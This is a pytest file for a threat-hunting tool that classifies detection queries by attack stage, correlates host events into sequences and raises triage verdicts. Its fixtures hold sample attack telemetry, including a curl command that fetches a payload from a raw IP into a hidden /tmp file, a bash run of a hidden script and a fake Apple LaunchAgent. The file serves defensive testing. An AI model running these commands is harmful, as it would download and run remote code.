"""Tests for Correlated Attack-Sequence Sweeps & Composite Hunt Execution.

Verifies:
- Query stage classification and kill-chain ordering
- Deduplication of identical rule stems across dialect extensions
- Multi-stage entity and temporal correlation across time windows
- Triage confidence elevation from inconclusive to true_positive
- End-to-end composite sweep execution via COUNT-FIRST safe gate
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from hecate_runner.config import Settings
from hecate_runner.execution.attack_sequence import (
    AttackStage,
    classify_query_stage,
    correlate_events_into_sequences,
    format_sequence_timeline,
    sort_and_group_queries,
)
from hecate_runner.execution.normalizer import NormalizedEvent, normalize_event
from hecate_runner.execution.safe_gate import SafeExecutionGate
from hecate_runner.execution.scheduler import HuntExecutionScheduler
from hecate_runner.execution.triage_agent import FindingTriageAgent
from hecate_runner.query_execution import MockQueryProvider


# --- 1. Query Stage Classification & Ordering --------------------------------


def test_classify_query_stage() -> None:
    assert classify_query_stage("dns_query__dns_lookup_of_domain.spl") == AttackStage.RECON_DELIVERY
    assert classify_query_stage("proxy__request_for_url.spl") == AttackStage.RECON_DELIVERY
    assert classify_query_stage("webserver__cve_2024_3400_exploit.spl") == AttackStage.INITIAL_ACCESS
    assert classify_query_stage("process_creation__curl_download.spl") == AttackStage.EXECUTION
    assert classify_query_stage("process_creation__bash_script.spl") == AttackStage.EXECUTION
    assert classify_query_stage("file_event__launchagent_persistence.spl") == AttackStage.PERSISTENCE_EVASION
    assert classify_query_stage("network_connection__c2_beacon.spl") == AttackStage.COMMAND_AND_CONTROL
    assert classify_query_stage("process_creation__whoami_discovery.spl") == AttackStage.DISCOVERY_CREDENTIALS


def test_sort_and_group_queries_progression(tmp_path: Path) -> None:
    queries_dir = tmp_path / "queries"
    queries_dir.mkdir()

    # Create queries out of order
    f_persist = queries_dir / "file_event__persistence.spl"
    f_persist.write_text("TargetFilename=*.plist")

    f_dns = queries_dir / "dns_query__delivery.spl"
    f_dns.write_text("QueryName=bad.com")

    f_exec = queries_dir / "process_creation__run.spl"
    f_exec.write_text("Image=/bin/bash")

    f_c2 = queries_dir / "network_connection__beacon.spl"
    f_c2.write_text("DestinationPort=443")

    # Duplicate rule in different dialect (should be deduplicated by stem)
    f_exec_kql = queries_dir / "process_creation__run.kql"
    f_exec_kql.write_text("DeviceProcessEvents")

    grouped = sort_and_group_queries([f_persist, f_dns, f_exec, f_c2, f_exec_kql])

    # Should deduplicate process_creation__run
    assert len(grouped) == 4

    # Ordering must strictly follow attack progression:
    # 1. Recon/Delivery (dns) -> 2. Execution -> 3. Persistence -> 4. C2
    stages_order = [g["stage"] for g in grouped]
    assert stages_order == [
        AttackStage.RECON_DELIVERY.value,
        AttackStage.EXECUTION.value,
        AttackStage.PERSISTENCE_EVASION.value,
        AttackStage.COMMAND_AND_CONTROL.value,
    ]


# --- 2. Temporal and Entity Correlation ---------------------------------------


def test_correlate_attack_sequence_confirmed() -> None:
    """Events spanning 3 distinct attack stages on the same host within 120s."""
    t0 = datetime(2026, 11, 15, 23, 0, 0, tzinfo=UTC)
    t1 = t0 + timedelta(seconds=15)
    t2 = t0 + timedelta(seconds=45)

    events = [
        NormalizedEvent(
            event_id="evt-dns-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t0.isoformat(),
            host="victim-macbook-pro",
            user="developer",
            stage=AttackStage.RECON_DELIVERY.value,
            query_file="dns_query__delivery.spl",
            raw_data={"QueryName": "profitnow.io"},
        ),
        NormalizedEvent(
            event_id="evt-proc-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t1.isoformat(),
            host="victim-macbook-pro",
            user="developer",
            process_name="/usr/bin/curl",
            command_line="curl -s http://193.29.224.151/payload -o /tmp/.loader",
            stage=AttackStage.EXECUTION.value,
            query_file="process_creation__curl.spl",
        ),
        NormalizedEvent(
            event_id="evt-file-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t2.isoformat(),
            host="victim-macbook-pro",
            user="developer",
            file_path="/Users/developer/Library/LaunchAgents/com.apple.bad.plist",
            stage=AttackStage.PERSISTENCE_EVASION.value,
            query_file="file_event__launchagent.spl",
        ),
    ]

    sequences = correlate_events_into_sequences(events, max_window_sec=3600)
    assert len(sequences) == 1

    seq = sequences[0]
    assert seq.is_confirmed_sequence
    assert seq.entity_type == "host"
    assert seq.entity_value == "victim-macbook-pro"
    assert seq.distinct_stages_count == 3
    assert seq.total_span_seconds == 45.0
    assert seq.confidence_boost == 0.95

    # Check ASCII timeline formatting
    timeline = format_sequence_timeline(seq)
    assert "Correlated Attack Sequence on host 'victim-macbook-pro'" in timeline
    assert "Recon & Delivery" in timeline
    assert "Process Execution & Tool Transfer" in timeline
    assert "Persistence & Defense Evasion" in timeline


def test_correlate_attack_sequence_isolated_single_stage() -> None:
    """Multiple events of the SAME stage do not form a multi-stage sequence."""
    t0 = datetime(2026, 11, 15, 23, 0, 0, tzinfo=UTC)
    events = [
        NormalizedEvent(
            event_id="evt-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t0.isoformat(),
            host="victim-macbook-pro",
            user="developer",
            stage=AttackStage.RECON_DELIVERY.value,
            query_file="dns_query__1.spl",
        ),
        NormalizedEvent(
            event_id="evt-2",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=(t0 + timedelta(seconds=10)).isoformat(),
            host="victim-macbook-pro",
            user="developer",
            stage=AttackStage.RECON_DELIVERY.value,
            query_file="dns_query__2.spl",
        ),
    ]

    sequences = correlate_events_into_sequences(events, max_window_sec=3600)
    assert len(sequences) == 0


def test_correlate_attack_sequence_different_hosts_not_mixed() -> None:
    """Events occurring on different hosts are not conflated."""
    t0 = datetime(2026, 11, 15, 23, 0, 0, tzinfo=UTC)
    events = [
        NormalizedEvent(
            event_id="evt-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t0.isoformat(),
            host="host-alpha",
            stage=AttackStage.RECON_DELIVERY.value,
        ),
        NormalizedEvent(
            event_id="evt-2",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=(t0 + timedelta(seconds=10)).isoformat(),
            host="host-beta",
            stage=AttackStage.EXECUTION.value,
        ),
    ]

    sequences = correlate_events_into_sequences(events, max_window_sec=3600)
    assert len(sequences) == 0


# --- 3. Triage Agent Verdict Elevation ----------------------------------------


def test_triage_agent_elevates_to_true_positive() -> None:
    """Triage agent upgrades inconclusive/suspicious single hits to true_positive when correlated."""
    t0 = datetime(2026, 11, 15, 23, 0, 0, tzinfo=UTC)
    events = [
        NormalizedEvent(
            event_id="evt-dns-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=t0.isoformat(),
            host="victim-macbook-pro",
            user="developer",
            stage=AttackStage.RECON_DELIVERY.value,
            query_file="dns_query.spl",
            raw_data={"QueryName": "profitnow.io"},
        ),
        NormalizedEvent(
            event_id="evt-proc-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=(t0 + timedelta(seconds=20)).isoformat(),
            host="victim-macbook-pro",
            user="developer",
            process_name="/bin/bash",
            command_line="bash /tmp/.UlaccK",
            stage=AttackStage.EXECUTION.value,
            query_file="process_creation.spl",
        ),
        NormalizedEvent(
            event_id="evt-file-1",
            hunt_id="H-0038",
            target_siem="splunk",
            timestamp=(t0 + timedelta(seconds=35)).isoformat(),
            host="victim-macbook-pro",
            user="developer",
            file_path="/Users/developer/Library/LaunchAgents/com.apple.softwareupdated.plist",
            stage=AttackStage.PERSISTENCE_EVASION.value,
            query_file="file_event.spl",
        ),
    ]

    agent = FindingTriageAgent()
    entities = {
        "hosts": ["victim-macbook-pro"],
        "users": ["developer"],
        "processes": ["/bin/bash"],
        "parent_processes": [],
        "ips": [],
        "hashes": [],
        "domains": ["profitnow.io"],
    }

    report = agent._evaluate_heuristics(
        hunt_id="H-0038",
        sweep_id="SWEEP-TEST-1",
        target_siem="splunk",
        events=events,
        entities=entities,
        hypothesis="Adversaries use ClickFix to execute Terminal commands and drain cryptocurrency",
        known_techniques=["T1071.004", "T1059.004", "T1543.001"],
    )

    # Must be elevated to true_positive with confidence 0.95 and escalate_to_soc
    assert report.verdict == "true_positive"
    assert report.confidence == 0.95
    assert report.recommended_action == "escalate_to_soc"
    assert "Confirmed multi-stage attack sequence on host 'victim-macbook-pro'" in report.summary
    assert "Correlated attack progression verified across 3 stages" in report.rationale
    assert report.assessment_source == "correlated_attack_sequence"


# --- 4. Composite Sweep SafeExecutionGate --------------------------------------


def test_safe_execution_gate_composite_sweep() -> None:
    """SafeExecutionGate evaluates each stage through COUNT-FIRST and tags metadata."""
    # Mock responses for 3 stages: [count=1, raw=1, count=1, raw=1, count=0 (clean)]
    mock_provider = MockQueryProvider(responses=[1, 1, 1, 1, 0])
    gate = SafeExecutionGate(mock_provider, max_auto_fetch=200)

    composite_queries = [
        {
            "query_file": "dns_query__delivery.spl",
            "query_text": 'QueryName="profitnow.io"',
            "stage": AttackStage.RECON_DELIVERY.value,
            "stage_label": AttackStage.RECON_DELIVERY.label,
        },
        {
            "query_file": "process_creation__curl.spl",
            "query_text": 'Image="*/curl"',
            "stage": AttackStage.EXECUTION.value,
            "stage_label": AttackStage.EXECUTION.label,
        },
        {
            "query_file": "file_event__persistence.spl",
            "query_text": 'TargetFilename="*.plist"',
            "stage": AttackStage.PERSISTENCE_EVASION.value,
            "stage_label": AttackStage.PERSISTENCE_EVASION.label,
        },
    ]

    result = gate.execute_composite_sweep(
        hunt_id="H-0038",
        target="splunk",
        composite_queries=composite_queries,
        time_range_days=1,
    )

    assert result.ok
    assert result.outcome == "hits_detected"
    assert result.matched_count == 2
    assert len(result.events) == 2

    # Verify stage tagging on retrieved events
    stage_tags = [ev.get("_hecate_stage") for ev in result.events]
    assert AttackStage.RECON_DELIVERY.value in stage_tags
    assert AttackStage.EXECUTION.value in stage_tags
